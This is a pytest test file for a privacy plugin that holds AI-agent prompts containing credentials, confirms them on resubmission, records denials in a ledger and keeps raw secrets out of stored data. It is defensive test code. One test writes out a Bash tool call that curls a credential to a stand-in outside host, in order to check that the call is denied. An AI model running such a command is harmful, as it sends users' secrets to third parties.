from __future__ import annotations

import dataclasses

import pytest

from privacy_hud import dispatch as dispatch_mod
from privacy_hud.accounting import Evidence
from privacy_hud.detect.base import Cost, DetectorProfile, Finding
from privacy_hud.detect.model import StubModelDetector
from privacy_hud.detect.secrets import SecretDetector
from privacy_hud.hud_snapshot import read_snapshot
from privacy_hud.render import audit, hud_line, receipt
from runtime_helpers import close_writer, writer_state
from test_prompt_hold import A, B, CONFIRMED, HELD, Clock


@pytest.fixture
def harness(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("PLUGIN_DATA", str(tmp_path))
    monkeypatch.setattr(
        dispatch_mod, "ModelDetector", lambda: StubModelDetector([])
    )
    state = writer_state(tmp_path)
    clock = Clock()
    state.prompt_clock = clock
    yield state, clock
    close_writer(state.ledger)


def send(state, event, sid="s", **fields):
    return dispatch_mod.dispatch(
        state,
        {"hook_event_name": event, "session_id": sid, **fields},
    )


def prompt(state, text, sid="s"):
    return send(state, "UserPromptSubmit", sid, prompt=text)


def test_real_resubmission_surface_and_session_isolation(harness):
    state, clock = harness
    send(state, "SessionStart")
    assert prompt(state, "first " + A) == {"decision": "block", "reason": HELD}
    clock.now += 2
    assert prompt(state, "edited explanation " + A) == {
        "systemMessage": CONFIRMED
    }
    assert prompt(state, A) == {}
    assert prompt(state, B)["decision"] == "block"
    send(state, "SessionStart", "other")
    assert prompt(state, A, "other")["decision"] == "block"


def test_case_changed_credential_requires_its_own_hold(harness):
    state, clock = harness
    send(state, "SessionStart")
    prompt(state, A)
    clock.now += 2
    assert prompt(state, A) == {"systemMessage": CONFIRMED}
    changed = "ghp_" + A[4:].swapcase()
    assert prompt(state, changed)["decision"] == "block"


class DeepCredential:
    profile = DetectorProfile(tier=3, cost=Cost.EXPENSIVE)
    available = True

    def __init__(self):
        self.calls = 0

    def scan(self, text, ctx):
        self.calls += 1
        return [Finding("credential", text, 0, len(text))]


def test_tier3_credentials_never_hold_and_allowed_prompts_keep_deep_scan(harness):
    state, clock = harness
    deep = DeepCredential()
    state.detectors = [SecretDetector(), deep]
    send(state, "SessionStart")
    assert prompt(state, "ordinary identifier") == {}
    assert deep.calls == 1
    assert prompt(state, A)["decision"] == "block"
    assert deep.calls == 1
    clock.now += 2
    assert prompt(state, A) == {"systemMessage": CONFIRMED}
    assert deep.calls == 2


class ForbiddenDeepScan:
    profile = DetectorProfile(tier=3, cost=Cost.EXPENSIVE)
    available = True

    def scan(self, text, ctx):
        raise AssertionError("held prompt reached the deep scan")


@pytest.mark.parametrize("available", [False, True])
def test_hold_precedes_unavailable_or_slow_model(harness, available):
    state, _clock = harness
    deep = ForbiddenDeepScan()
    deep.available = available
    state.detectors = [SecretDetector(), deep]
    send(state, "SessionStart")
    assert prompt(state, A) == {"decision": "block", "reason": HELD}
    assert state.ledger.conn.execute(
        "SELECT COUNT(*) FROM scan_gaps WHERE session_id=?", ("s",)
    ).fetchone()[0] == 0
    assert state.ledger.conn.execute(
        "SELECT scan_gap FROM observations "
        "WHERE session_id=? AND hook_event='UserPromptSubmit'", ("s",)
    ).fetchone()[0] is None


@pytest.mark.parametrize(
    "text",
    [
        'password="aB3dE5gH7jK9mN2pQ4sT6vW8"',
        '"aB3dE5gH7jK9mN2pQ4sT6vW8"',
        "-----BEGIN RSA PRIVATE KEY-----",
    ],
)
def test_noneligible_tier1_findings_do_not_hold(harness, text):
    state, _clock = harness
    send(state, "SessionStart")
    assert prompt(state, text) == {}


def test_only_prompt_text_is_inspected(harness):
    state, _clock = harness
    send(state, "SessionStart")
    assert send(
        state, "UserPromptSubmit", prompt="ordinary text",
        attachments=[{"text": A}], images=[{"text": A}],
    ) == {}


def test_hold_is_issued_prevention_not_confirmed_enforcement(harness):
    state, clock = harness
    send(state, "SessionStart")
    assert prompt(state, A)["decision"] == "block"

    conn = state.ledger.conn
    observation = conn.execute(
        "SELECT * FROM observations WHERE hook_event='UserPromptSubmit'"
    ).fetchone()
    assert observation["decision"] == "deny"
    assert observation["phase"] == "pre"
    assert observation["action_kind"] == "prompt"
    assert observation["boundary"] == "B1"
    assert observation["resolution_scope"] == "none"
    assert observation["potential_crossing"] == 1
    evidence = Evidence(observation["evidence"])
    assert Evidence.DENY_ISSUED in evidence
    assert not evidence & (
        Evidence.DENY_ENFORCED
        | Evidence.REJECTED_BEFORE_CROSSING
        | Evidence.CROSSING_CONFIRMED
    )

    held = state.ledger.list_events("s", "prevented")
    assert len(held) == 1
    assert held[0].masked_example is None
    summary = state.ledger.summary("s")
    assert summary.confirmed_points == 0
    assert summary.denials_issued == 1
    assert summary.denials_enforced == 0
    assert summary.distinct_disclosures == 0
    assert summary.unresolved_actions == 1
    assert conn.execute("PRAGMA user_version").fetchone()[0] == 5402

    clock.now += 2
    assert prompt(state, A) == {"systemMessage": CONFIRMED}
    assert not state.ledger.list_events("s", "exposed")
    assert len(state.ledger.list_events("s", "detected")) == 1
    assert state.ledger.summary("s").confirmed_points == 0


def test_independent_crossing_evidence_still_uses_existing_v2_accounting(harness):
    from test_accounting_dispatch import ScriptedAdapter, receipt as evidence_receipt

    state, clock = harness
    send(state, "SessionStart")
    prompt(state, A)
    clock.now += 2

    adapter = ScriptedAdapter()
    adapter.on(
        "UserPromptSubmit", None,
        evidence=Evidence.CROSSING_CONFIRMED,
        scope="pairs",
        receipts=lambda key: [evidence_receipt(
            key, A, "credential", source="user prompt"
        )],
    )
    state.hook_adapter = adapter
    assert prompt(state, A) == {"systemMessage": CONFIRMED}
    assert len(state.ledger.list_events("s", "exposed")) == 1
    assert state.ledger.summary("s").confirmed_points > 0


def test_legacy_hold_does_not_swallow_later_exposure(harness):
    state, clock = harness
    state.ledger.start_session("s", cwd="/synthetic", model="test")
    send(state, "SessionStart")
    assert prompt(state, A)["decision"] == "block"
    held = state.ledger.list_events("s", "prevented")
    assert len(held) == 1
    assert held[0].value_hash is None
    assert state.ledger.summary("s").legacy_score == 0
    clock.now += 2
    assert prompt(state, A) == {"systemMessage": CONFIRMED}
    exposed = state.ledger.list_events("s", "exposed")
    assert len(exposed) == 1
    score = state.ledger.summary("s").legacy_score
    assert score > 0
    assert prompt(state, A) == {}
    assert state.ledger.summary("s").legacy_score == score


def test_prompt_authorization_does_not_allow_tool_egress(harness):
    state, clock = harness
    send(state, "SessionStart")
    prompt(state, A)
    clock.now += 2
    prompt(state, A)
    out = send(
        state, "PreToolUse", tool_name="Bash",
        tool_input={"command": f"curl https://example.invalid -d {A}"},
    )
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_restart_holds_again_without_recreating_v2_accounting_key(harness):
    state, clock = harness
    send(state, "SessionStart")
    prompt(state, A)
    clock.now += 2
    prompt(state, A)

    # Simulate process-memory loss with a new State over the same test ledger.
    replacement = dataclasses.replace(
        state, engines={}, salts={}, accounting_keys={}, started_at={}, live={}
    )
    dispatch_mod._invalidate_missing_accounting_keys(replacement)
    assert prompt(replacement, A)["decision"] == "block"
    assert replacement.accounting_keys == {}
    assert replacement.ledger.summary("s").accounting_status == "unavailable"


def test_session_end_discards_gate_memory(harness):
    state, _clock = harness
    send(state, "SessionStart")
    prompt(state, A)
    gate = state.engines["s"].prompt_gate
    send(state, "SessionEnd")
    assert "s" not in state.engines
    assert gate.pending == {}
    assert gate.allowed == set()
    assert gate.deliveries == {}


@pytest.mark.parametrize("legacy", [False, True])
@pytest.mark.parametrize("failure_site", ["accounting", "record", "after_record"])
def test_hold_recording_failure_blocks_on_wire_and_keeps_resubmission(
    harness, monkeypatch, legacy, failure_site
):
    import io
    import json
    import sqlite3
    from types import SimpleNamespace

    from privacy_hud.daemon import _Handler
    from privacy_hud.runtime_client import hello_request
    from privacy_hud.runtime_contract import PROTOCOL_VERSION
    from runtime_helpers import activation

    state, clock = harness
    if legacy:
        state.ledger.start_session("s", cwd="/synthetic", model="test")
    send(state, "SessionStart")
    gate = state.engines["s"].prompt_gate
    selected = activation()
    payload = {
        "hook_event_name": "UserPromptSubmit", "session_id": "s", "prompt": A
    }
    expected = {
        "decision": "block",
        "reason": HELD + (
            "\n\n  Ledger recording failed; this hold may be missing "
            "from the session audit.\n"
            "  The resubmission instructions still apply while "
            "this session and daemon remain active."
        ),
    }

    def wire(key):
        request = {
            "v": PROTOCOL_VERSION, "op": "event",
            "build_id": selected.identity.build_id,
            "activation_epoch": selected.epoch,
            "payload": payload, "delivery_key": key,
        }
        handler = object.__new__(_Handler)
        handler.server = SimpleNamespace(state=state, activation=selected)
        handler.rfile = io.BytesIO(b"".join(
            (json.dumps(frame) + "\n").encode()
            for frame in (hello_request(selected), request)
        ))
        handler.wfile = io.BytesIO()
        handler.handle()
        frames = [
            json.loads(line)
            for line in handler.wfile.getvalue().splitlines()
        ]
        assert len(frames) == 2 and frames[0]["ok"] is True
        assert frames[1] == {
            "v": PROTOCOL_VERSION, "op": "event", "ok": True,
            "output": expected,
        }
        assert A not in handler.wfile.getvalue().decode()

    original = dispatch_mod.Engine.record_prompt_hold

    def fail(*args, **kwargs):
        if failure_site == "after_record":
            original(*args, **kwargs)
        # Exception text must never enter the reply or a persistent sink.
        raise sqlite3.OperationalError(A)

    before = "\n".join(state.ledger.conn.iterdump())
    with monkeypatch.context() as patch:
        if failure_site == "accounting":
            patch.setattr(dispatch_mod, "_accounting_for", fail)
        else:
            patch.setattr(dispatch_mod.Engine, "record_prompt_hold", fail)
        wire("a1" * 16)
        dump = "\n".join(state.ledger.conn.iterdump())
        if failure_site != "after_record":
            assert dump == before
        else:
            assert len(state.ledger.list_events("s", "prevented")) == 1
        assert A not in dump
        pending = dict(gate.pending)
        assert len(pending) == 1
        assert set(pending.values()) == {clock.now}
        assert gate.allowed == set()
        assert gate._confirmations == {}

        clock.now += 1
        wire("b2" * 16)  # Early repeat must not reset the window.
        assert gate.pending == pending
        clock.now += 1
        wire("a1" * 16)  # A replay cannot become a confirmation.
        assert gate.pending == pending
        assert gate.deliveries["a1" * 16].hold
        assert gate.allowed == set()

    # A fresh submission, after recovery, can use the original window.
    assert dispatch_mod.dispatch(
        state, payload, delivery_key="c3" * 16
    ) == {"systemMessage": CONFIRMED}
    assert len(gate.allowed) == 1
    assert gate.pending == {}
    assert dispatch_mod.dispatch(
        state, payload, delivery_key="a1" * 16
    ) == {"decision": "block", "reason": HELD}
    assert len(gate.allowed) == 1
    assert prompt(state, A) == {}


@pytest.mark.parametrize("legacy", [False, True])
@pytest.mark.parametrize("failure_site", ["scan", "observe"])
def test_confirmation_after_unrecorded_hold_remains_provisional(
    harness, monkeypatch, legacy, failure_site
):
    import sqlite3

    state, clock = harness
    if legacy:
        state.ledger.start_session("s", cwd="/synthetic", model="test")
    send(state, "SessionStart")
    gate = state.engines["s"].prompt_gate

    def fail(*args, **kwargs):
        raise sqlite3.OperationalError("synthetic failure")

    with monkeypatch.context() as patch:
        patch.setattr(dispatch_mod.Engine, "record_prompt_hold", fail)
        assert prompt(state, A)["decision"] == "block"
    clock.now += 2
    payload = {
        "hook_event_name": "UserPromptSubmit", "session_id": "s", "prompt": A
    }
    before = "\n".join(state.ledger.conn.iterdump())
    with monkeypatch.context() as patch:
        patch.setattr(dispatch_mod.Engine, failure_site, fail)
        with pytest.raises(sqlite3.OperationalError):
            dispatch_mod.dispatch(state, payload, delivery_key="d4" * 16)
    assert "\n".join(state.ledger.conn.iterdump()) == before
    assert gate.allowed == set()
    assert gate.pending == {}
    assert gate._confirmations == {}
    assert "d4" * 16 not in gate.deliveries

    assert dispatch_mod.dispatch(
        state, payload, delivery_key="d4" * 16
    ) == {"decision": "block", "reason": HELD}
    clock.now += 2
    assert prompt(state, A) == {"systemMessage": CONFIRMED}


@pytest.mark.parametrize("legacy", [False, True])
@pytest.mark.parametrize("end_fails", [False, True])
def test_session_end_clears_unrecorded_hold_and_replay(
    harness, monkeypatch, legacy, end_fails
):
    import sqlite3

    state, clock = harness
    if legacy:
        state.ledger.start_session("s", cwd="/synthetic", model="test")
    send(state, "SessionStart")
    gate = state.engines["s"].prompt_gate
    payload = {
        "hook_event_name": "UserPromptSubmit", "session_id": "s", "prompt": A
    }

    def fail(*args, **kwargs):
        raise sqlite3.OperationalError("synthetic failure")

    with monkeypatch.context() as patch:
        patch.setattr(dispatch_mod.Engine, "record_prompt_hold", fail)
        assert dispatch_mod.dispatch(
            state, payload, delivery_key="e5" * 16
        )["decision"] == "block"
    assert gate.pending
    assert gate.deliveries["e5" * 16].hold
    with monkeypatch.context() as patch:
        if end_fails:
            patch.setattr(state.ledger, "end_session", fail)
            with pytest.raises(sqlite3.OperationalError):
                send(state, "SessionEnd")
        else:
            send(state, "SessionEnd")
    assert "s" not in state.engines
    assert gate.pending == {}
    assert gate.allowed == set()
    assert gate.deliveries == {}
    assert gate._confirmations == {}
    assert gate._salt == b""

    clock.now += 2
    assert dispatch_mod.dispatch(
        state, payload, delivery_key="e5" * 16
    ) == {"decision": "block", "reason": HELD}
    assert gate.pending == {}
    assert gate.deliveries == {}


@pytest.mark.parametrize("failure_site", ["scan", "observe"])
@pytest.mark.parametrize("legacy", [False, True])
def test_failed_confirmation_requires_a_new_hold(
    harness, monkeypatch, failure_site, legacy
):
    state, clock = harness
    if legacy:
        state.ledger.start_session("s", cwd="/synthetic", model="test")
    send(state, "SessionStart")
    assert prompt(state, A)["decision"] == "block"
    clock.now += 2
    gate = state.engines["s"].prompt_gate

    def counts():
        tables = [
            row[0]
            for row in state.ledger.conn.execute(
                "SELECT name FROM sqlite_master WHERE type='table' AND name"
                " IN ('observations', 'events', 'events_legacy_v1')"
                " ORDER BY name"
            )
        ]
        assert tables
        return tuple(
            state.ledger.conn.execute(
                f"SELECT COUNT(*) FROM {table} WHERE session_id=?",
                ("s",),
            ).fetchone()[0]
            for table in tables
        )

    before = counts()
    original = getattr(dispatch_mod.Engine, failure_site)
    armed = True

    def fail_once(engine, obs, *args, **kwargs):
        nonlocal armed
        if armed and obs.hook_event == "UserPromptSubmit" and obs.text == A:
            armed = False
            raise RuntimeError("synthetic confirmation failure")
        return original(engine, obs, *args, **kwargs)

    monkeypatch.setattr(dispatch_mod.Engine, failure_site, fail_once)
    payload = {
        "hook_event_name": "UserPromptSubmit",
        "session_id": "s",
        "prompt": A,
    }
    with pytest.raises(RuntimeError, match="synthetic confirmation failure"):
        dispatch_mod.dispatch(
            state, payload, delivery_key="fafafafafafafafafafafafafafafafa"
        )

    assert not armed
    assert counts() == before
    assert gate.allowed == set()
    assert "fafafafafafafafafafafafafafafafa" not in gate.deliveries

    # The failed delivery's cached allow must not survive either.
    assert dispatch_mod.dispatch(
        state, payload, delivery_key="fafafafafafafafafafafafafafafafa"
    ) == {"decision": "block", "reason": HELD}
    assert prompt(state, A) == {"decision": "block", "reason": HELD}

    clock.now += 2
    assert prompt(state, A) == {"systemMessage": CONFIRMED}
    assert prompt(state, A) == {}


def test_failed_confirmation_preserves_other_delivery_changes(
    harness, monkeypatch
):
    from privacy_hud.prompt_hold import credential_hash

    state, clock = harness
    send(state, "SessionStart")
    assert prompt(state, A)["decision"] == "block"
    assert prompt(state, B)["decision"] == "block"
    clock.now += 2
    engine = state.engines["s"]
    gate = engine.prompt_gate
    c = "ghp_" + "Ef56" * 9
    b_hash = credential_hash(engine.salt, B)
    c_hash = credential_hash(engine.salt, c)
    original = dispatch_mod.Engine.scan
    armed = True

    def interleave_then_fail(current, obs):
        nonlocal armed
        if armed and obs.hook_event == "UserPromptSubmit" and obs.text == A:
            armed = False
            assert prompt(state, B) == {"systemMessage": CONFIRMED}
            assert prompt(state, c)["decision"] == "block"
            raise RuntimeError("synthetic outer scan failure")
        return original(current, obs)

    monkeypatch.setattr(dispatch_mod.Engine, "scan", interleave_then_fail)
    with pytest.raises(RuntimeError, match="synthetic outer scan failure"):
        prompt(state, A)

    # A whole snapshot restore would erase both intervening changes.
    assert gate.allowed == {b_hash}
    assert gate.pending[c_hash] == clock.now
    assert prompt(state, B) == {}
    assert prompt(state, c)["decision"] == "block"
    assert prompt(state, A)["decision"] == "block"


def test_unrecorded_confirmation_cannot_authorize_another_delivery(
    harness, monkeypatch
):
    from privacy_hud.prompt_hold import credential_hash

    state, clock = harness
    send(state, "SessionStart")
    assert prompt(state, A)["decision"] == "block"
    clock.now += 2
    engine = state.engines["s"]
    gate = engine.prompt_gate
    a_hash = credential_hash(engine.salt, A)
    original = dispatch_mod.Engine.scan
    nested = []
    armed = True

    def interleave_then_fail(current, obs):
        nonlocal armed
        if armed and obs.hook_event == "UserPromptSubmit" and obs.text == A:
            armed = False
            nested.append(prompt(state, A))
            raise RuntimeError("synthetic outer scan failure")
        return original(current, obs)

    monkeypatch.setattr(dispatch_mod.Engine, "scan", interleave_then_fail)
    with pytest.raises(RuntimeError, match="synthetic outer scan failure"):
        prompt(state, A)

    assert nested == [{"decision": "block", "reason": HELD}]
    assert gate.allowed == set()
    # Failure must preserve the other delivery's newly recorded hold.
    assert gate.pending[a_hash] == clock.now
    assert prompt(state, A)["decision"] == "block"
    clock.now += 2
    assert prompt(state, A) == {"systemMessage": CONFIRMED}


def test_session_end_during_confirmation_suppresses_stale_notice(
    harness, monkeypatch
):
    state, clock = harness
    send(state, "SessionStart")
    assert prompt(state, A)["decision"] == "block"
    clock.now += 2
    gate = state.engines["s"].prompt_gate
    original = dispatch_mod.Engine.scan
    armed = True

    def end_during_scan(engine, obs):
        nonlocal armed
        if armed and obs.hook_event == "UserPromptSubmit" and obs.text == A:
            armed = False
            send(state, "SessionEnd")
        return original(engine, obs)

    monkeypatch.setattr(dispatch_mod.Engine, "scan", end_during_scan)
    out = prompt(state, A)

    assert CONFIRMED not in out.get("systemMessage", "")
    assert "s" not in state.engines
    assert gate.pending == {}
    assert gate.allowed == set()
    assert gate.deliveries == {}
    assert gate._salt == b""
    assert prompt(state, A)["decision"] == "block"


def test_failed_duplicate_cannot_revoke_a_recorded_confirmation(
    harness, monkeypatch
):
    state, clock = harness
    send(state, "SessionStart")
    assert prompt(state, A)["decision"] == "block"
    clock.now += 2
    gate = state.engines["s"].prompt_gate
    original = dispatch_mod.Engine.scan
    armed = True
    payload = {
        "hook_event_name": "UserPromptSubmit",
        "session_id": "s",
        "prompt": A,
    }
    key = "d0d0d0d0d0d0d0d0d0d0d0d0d0d0d0d0"

    def record_duplicate_then_fail(engine, obs):
        nonlocal armed
        if armed and obs.hook_event == "UserPromptSubmit" and obs.text == A:
            armed = False
            assert dispatch_mod.dispatch(
                state, payload, delivery_key=key
            ) == {"systemMessage": CONFIRMED}
            raise RuntimeError("synthetic duplicate failure")
        return original(engine, obs)

    monkeypatch.setattr(
        dispatch_mod.Engine, "scan", record_duplicate_then_fail
    )
    with pytest.raises(RuntimeError, match="synthetic duplicate failure"):
        dispatch_mod.dispatch(state, payload, delivery_key=key)

    assert len(gate.allowed) == 1
    assert gate.deliveries[key].confirmed == ("GitHub token format",)
    assert prompt(state, A) == {}


def test_hold_surfaces_and_persistence_contain_no_credential(harness):
    from privacy_hud.prompt_hold import credential_hash

    state, _clock = harness
    send(state, "SessionStart")
    prompt(state, A)
    summary = state.ledger.summary("s")
    rows = [
        row.to_exposure()
        for row in state.ledger.list_events("s", "prevented")
    ]
    report = audit(summary, rows, "Prevented", session_id="s")
    assert "DENIAL ISSUED" in report
    snap = read_snapshot(state.data_dir, "s", ignore_staleness=True)
    assert snap is not None
    # Phase 4's fixed counter label ("N denials issued"), unchanged here.
    assert "1 denials issued" in hud_line(snap, 200)
    assert "denials issued: 1" in receipt("s", summary, [], None).lower()

    dump = "\n".join(state.ledger.conn.iterdump())
    confirmation_hash = credential_hash(state.engines["s"].salt, A)
    assert confirmation_hash.hex() not in dump.lower()
    assert A not in dump
    assert A not in report
    for path in state.data_dir.rglob("*"):
        if path.is_file():
            assert A.encode() not in path.read_bytes()
